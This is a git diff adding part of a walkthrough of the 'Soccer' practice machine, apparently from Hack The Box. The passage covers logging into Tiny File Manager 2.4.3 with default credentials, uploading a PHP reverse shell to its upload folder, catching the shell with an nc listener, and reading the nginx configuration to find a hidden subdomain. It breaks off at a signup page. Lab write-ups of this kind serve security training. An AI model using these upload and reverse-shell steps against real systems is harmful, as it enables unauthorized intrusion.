@@ -222,4 +222,90 @@ Doing some reasearch on this application, we find that there are admin and user 
 Using the admin default credentials we found online, I was able to log into the file manager via admin credentials.
 <img width="2422" height="600" alt="image" src="https://github.com/user-attachments/assets/aec55484-dbd9-4aa8-b9d0-97f41a41b365" />
 
-At the bottom corner of the webpage, we see that this version of H3K Tiny File Manager is 2.4.3, which is both vulnerable to high severity exploits like `CVE-2022-45476` and 
+At the bottom corner of the webpage, we see that this version of H3K Tiny File Manager is 2.4.3, which is both vulnerable to high severity exploits like `CVE-2022-45476` and `CVE-2021-45010`. Both of these CVEs involve abusing the upload functionality to upload malicious PHP files that can be used to obtain command execution.
+
+So creating a simple php shell, I tried to upload this file into the main directory. However, when attempting to upload the shell, we get an error explaining that we don't have permissions to upload in this directory.
+
+However, we see that there is a `tiny` directory that leads us to an `upload` directory.
+<img width="2069" height="544" alt="image" src="https://github.com/user-attachments/assets/d406158c-45e3-4cba-9e3c-ac290597c1fa" />
+
+When we attempt to upload a file in this directory, we are successful, and navigating to this file, we also see that command execution is successful.
+<img width="989" height="669" alt="image" src="https://github.com/user-attachments/assets/7dd9e362-de91-4918-8b4b-6a157f706a92" />
+<img width="807" height="235" alt="image" src="https://github.com/user-attachments/assets/62349d70-cc36-4943-bc5a-0d2de1886cd8" />
+
+Using the PHP PentestMonkey shell and renaming the file `shell2.php`, I uploaded this payload to the `upload` folder, started a listener on my machine, and once I navigated to the php script I was able to get a reverse shell as `www-data`
+
+<img width="956" height="623" alt="image" src="https://github.com/user-attachments/assets/97e81138-3731-43b4-8883-2000a32252b6" />
+
+
+```
+┌──(kali㉿kali)-[~/Boxes/random_boxes/soccer]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.86] from (UNKNOWN) [10.129.226.212] 60566
+Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 22:52:34 up  3:22,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (936): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soccer:/$ whoami
+whoami
+www-data
+www-data@soccer:/$ 
+```
+Looking into the `/home` directory, we see that there is a user by the name of `player`.
+```
+www-data@soccer:/$ cd home
+cd homels 
+www-data@soccer:/home$ -la
+ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Nov 17  2022 .
+drwxr-xr-x 21 root   root   4096 Dec  1  2022 ..
+drwxr-xr-x  3 player player 4096 Nov 28  2022 player
+```
+When looking through the machine, there seems to be nothing of interest in the /var directory. There doesn't seem to be any suspicious processes running on the machine, and there aren't any files owned by `player` that are interesting for me.
+
+However, knowing that this website iserver uses nginx, I navigated to the `/etc/nginx` directory to look through the configuration files of the web server. Wanting to see if there are any custom subdomains my ealier enumeration was not able to pick up, I found that there is a `soc-player` web server listening on port 3000
+```
+www-data@soccer:/etc/nginx/sites-available$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root root 4096 Dec  1  2022 .
+drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
+-rw-r--r-- 1 root root  442 Dec  1  2022 default
+-rw-r--r-- 1 root root  332 Nov 17  2022 soc-player.htb
+www-data@soccer:/etc/nginx/sites-available$ cat soc-palyer.htb
+cat soc-palyer.htb
+cat: soc-palyer.htb: No such file or directory
+www-data@soccer:/etc/nginx/sites-available$ cat soc-player.htb
+cat soc-player.htb
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name soc-player.soccer.htb;
+
+        root /root/app/views;
+
+        location / {
+                proxy_pass http://localhost:3000;
+                proxy_http_version 1.1;
+                proxy_set_header Upgrade $http_upgrade;
+                proxy_set_header Connection 'upgrade';
+                proxy_set_header Host $host;
+                proxy_cache_bypass $http_upgrade;
+        }
+
+}
+```
+Adding this subdomain to my `/etc/host` file, I navigated to the website and while the website looks similar to the one before, we see at the top left that there are login and signup options we can interact with.
+<img width="2426" height="800" alt="image" src="https://github.com/user-attachments/assets/aa9a06b3-2c02-408a-b794-868641fb040f" />
+
+Going to the signup
+<img width="2429" height="949" alt="image" src="https://github.com/user-attachments/assets/c8089142-e78c-4910-8cf1-40fe0ce7cee3" />
+
+<img width="2424" height="675" alt="image" src="https://github.com/user-attachments/assets/902857cd-e723-4baf-badc-e139c0b242c8" />
+
+<img width="650" height="563" alt="image" src="https://github.com/user-attachments/assets/16f68614-745d-4b67-93e5-2356c56a841b" />
